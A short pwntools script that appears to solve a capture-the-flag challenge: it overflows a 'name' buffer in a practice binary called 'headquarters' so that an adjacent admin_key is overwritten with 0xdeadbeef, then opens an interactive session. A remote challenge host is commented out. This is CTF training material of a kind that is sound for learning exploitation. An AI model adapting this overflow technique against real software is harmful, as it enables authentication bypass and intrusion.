from pwn import *

elf = context.binary = ELF('../src/headquarters')

# connect to the remote binary
# io = remote('chal1.sieberr.live', 10003)

# or run the binary
io = elf.process(stdin=PTY)

payload = b'A'*8 # fill up the `name` buffer
payload += p32(0xdeadbeef) # overwrite `admin_key` to 0xdeadbeef

io.sendline(payload)
io.interactive()